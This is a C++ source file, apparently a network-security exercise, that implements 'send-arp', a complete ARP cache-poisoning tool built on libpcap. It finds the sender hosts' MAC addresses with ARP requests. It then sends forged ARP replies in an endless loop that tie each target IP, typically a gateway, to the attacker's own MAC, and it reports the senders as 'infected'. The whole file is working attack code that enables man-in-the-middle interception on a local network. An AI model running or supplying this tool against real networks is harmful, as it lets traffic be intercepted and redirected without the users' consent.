#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <vector>

#ifdef __linux__
#include <netpacket/packet.h>
#elif defined(__APPLE__)
#include <net/if_dl.h>
#endif

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct Info {
	Ip senderIp;
	Ip targetIp;
	Mac senderMac;
};

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyMac(char* dev, Mac* mac) {
#ifdef __linux__
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl SIOCGIFHWADDR");
		close(fd);
		return false;
	}

	*mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
	close(fd);
	return true;
#else
	ifaddrs* ifap;
	if (getifaddrs(&ifap) != 0) {
		perror("getifaddrs");
		return false;
	}

	bool ok = false;
	for (ifaddrs* ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == nullptr) continue;
		if (strcmp(ifa->ifa_name, dev) != 0) continue;
		if (ifa->ifa_addr->sa_family != AF_LINK) continue;

		sockaddr_dl* sdl = (sockaddr_dl*)ifa->ifa_addr;
		if (sdl->sdl_alen == Mac::Size) {
			*mac = Mac((uint8_t*)LLADDR(sdl));
			ok = true;
			break;
		}
	}

	freeifaddrs(ifap);
	return ok;
#endif
}

bool getMyIp(char* dev, Ip* ip) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return false;
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl SIOCGIFADDR");
		close(fd);
		return false;
	}

	sockaddr_in* sin = (sockaddr_in*)&ifr.ifr_addr;
	*ip = Ip(ntohl(sin->sin_addr.s_addr));
	close(fd);
	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];

	Mac myMac;
	Ip myIp;
	if (!getMyMac(dev, &myMac)) return EXIT_FAILURE;
	if (!getMyIp(dev, &myIp)) return EXIT_FAILURE;

	std::vector<Info> infos;
	for (int i = 2; i < argc; i += 2) {
		Info info;
		info.senderIp = Ip(argv[i]);
		info.targetIp = Ip(argv[i + 1]);
		info.senderMac = Mac::nullMac();
		infos.push_back(info);
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live error: %s\n", errbuf);
		return EXIT_FAILURE;
	}

	printf("my mac=%s my ip=%s\n", std::string(myMac).c_str(), std::string(myIp).c_str());

	for (int i = 0; i < (int)infos.size(); i++) {
		EthArpPacket arpReq;
		arpReq.eth_.dmac_ = Mac::broadcastMac();
		arpReq.eth_.smac_ = myMac;
		arpReq.eth_.type_ = htons(EthHdr::Arp);

		arpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
		arpReq.arp_.pro_ = htons(EthHdr::Ip4);
		arpReq.arp_.hln_ = Mac::Size;
		arpReq.arp_.pln_ = Ip::Size;
		arpReq.arp_.op_ = htons(ArpHdr::Request);
		arpReq.arp_.smac_ = myMac;
		arpReq.arp_.sip_ = htonl(myIp);
		arpReq.arp_.tmac_ = Mac::nullMac();
		arpReq.arp_.tip_ = htonl(infos[i].senderIp);

		if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpReq), sizeof(EthArpPacket)) != 0) {
			fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
			pcap_close(handle);
			return EXIT_FAILURE;
		}

		while (true) {
			pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
				pcap_close(handle);
				return EXIT_FAILURE;
			}
			if (header->caplen < sizeof(EthArpPacket)) continue;

			EthArpPacket* recv = (EthArpPacket*)packet;
			if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
			if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
			if (ntohl(recv->arp_.sip_) != infos[i].senderIp) continue;

			infos[i].senderMac = recv->arp_.smac_;
			printf("sender ip=%s sender mac=%s\n",
				std::string(infos[i].senderIp).c_str(),
				std::string(infos[i].senderMac).c_str());
			break;
		}
	}

	for (int i = 0; i < (int)infos.size(); i++) {
		printf("infected sender=%s target=%s\n",
			std::string(infos[i].senderIp).c_str(),
			std::string(infos[i].targetIp).c_str());
	}

	while (true) {
		for (int i = 0; i < (int)infos.size(); i++) {
			EthArpPacket arpRep;
			arpRep.eth_.dmac_ = infos[i].senderMac;
			arpRep.eth_.smac_ = myMac;
			arpRep.eth_.type_ = htons(EthHdr::Arp);

			arpRep.arp_.hrd_ = htons(ArpHdr::ETHER);
			arpRep.arp_.pro_ = htons(EthHdr::Ip4);
			arpRep.arp_.hln_ = Mac::Size;
			arpRep.arp_.pln_ = Ip::Size;
			arpRep.arp_.op_ = htons(ArpHdr::Reply);
			arpRep.arp_.smac_ = myMac;
			arpRep.arp_.sip_ = htonl(infos[i].targetIp);
			arpRep.arp_.tmac_ = infos[i].senderMac;
			arpRep.arp_.tip_ = htonl(infos[i].senderIp);

			if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRep), sizeof(EthArpPacket)) != 0) {
				fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
				pcap_close(handle);
				return EXIT_FAILURE;
			}
		}
		sleep(1);
	}

	pcap_close(handle);
	return EXIT_SUCCESS;
}
